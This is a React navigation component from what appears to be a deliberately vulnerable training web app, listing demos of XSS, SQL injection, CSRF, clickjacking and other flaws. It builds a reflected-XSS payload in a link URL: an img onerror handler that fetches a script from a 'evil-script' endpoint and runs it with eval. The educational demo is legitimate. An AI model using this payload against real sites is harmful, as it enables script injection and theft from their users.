import React, { Component } from "react";
import {
    Link
} from "react-router-dom";
import './VulnerabilitiesList.css';


class VulnerabilitiesList extends Component {
    constructor(props) {
        super(props);
    }

    render() {
        let reflectedXss = "/reflected-xss?query=<img onerror='" +
            "var xmlHttp = new XMLHttpRequest(); " +
            "xmlHttp.onreadystatechange = function() {" +
            "    if (xmlHttp.readyState == XMLHttpRequest.DONE) {" +
            "        eval(xmlHttp.responseText);" +
            "    }" +
            "};" +
            "xmlHttp.open( \"GET\", \"http://localhost:8080/evil-script\", false ); " +
            "xmlHttp.send( null );" +
            "' src='invalid-image' />";

        return (
            <nav>

                <ul>
                    <h4>Main:</h4>
                    <li>
                        <Link to={reflectedXss}>Reflected XSS</Link>
                        <Link to="reflected-xss?query=cute pictures of cats">Normal usage</Link>
                    </li>
                    <li>
                        <Link to="/persistent-xss">Persistent XSS</Link>
                    </li>
                    <li>
                        <Link to="/sql-injection">SQL injection</Link>
                    </li>
                    <li>
                        <Link to="/csrf">CSRF</Link>
                    </li>
                    <li>
                        <Link to="/clickjacking">Clickjacking</Link>
                    </li>
                    <li>
                        <Link to="/brute-force">Vulnerability to Brute Force</Link>
                    </li>
                    <li>
                        <Link to="/insecure-object-reference">Insecure Direct Object References</Link>
                    </li>
                </ul>
            
            </nav>
        );
    }
}

export default VulnerabilitiesList;
